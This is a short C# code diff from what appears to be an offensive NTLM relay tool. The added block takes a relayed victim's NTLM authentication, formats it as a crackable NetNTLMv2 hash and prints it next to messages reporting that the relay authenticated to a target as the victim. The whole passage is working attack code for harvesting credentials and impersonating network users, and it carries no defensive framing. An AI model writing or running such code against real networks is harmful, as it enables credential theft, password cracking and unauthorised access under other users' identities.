@@ -1445,6 +1445,21 @@ switch (args[0])
 
         Console.WriteLine($"[*] victim {outcome.VictimEndpoint} relayed to {targetHost}");
         Console.WriteLine($"    relayed challenge (target's): {Convert.ToHexString(outcome.RelayedChallenge).ToLowerInvariant()}");
+
+        // Harvest the NetNTLMv2 hash from the victim's AUTHENTICATE + the (relayed) server challenge —
+        // the same crackable material impacket's SMB server logs for every capture.
+        try
+        {
+            byte[] serverChallenge = NtlmChallenge.Parse(outcome.RelayedChallenge).ServerChallenge;
+            NtlmAuthenticate victimAuth = NtlmAuthenticate.Parse(outcome.VictimAuthenticate);
+            Console.WriteLine($"[+] Captured NetNTLMv2 hash:");
+            Console.WriteLine($"    {NetNtlmv2.Format(serverChallenge, victimAuth)}");
+        }
+        catch (Exception ex)
+        {
+            Console.Error.WriteLine($"    (could not format captured hash: {ex.Message})");
+        }
+
         if (outcome.Relayed)
         {
             Console.WriteLine($"[+] Relay SUCCEEDED: authenticated to {targetHost} as the victim (target session 0x{target.Client.SessionId:X}).");
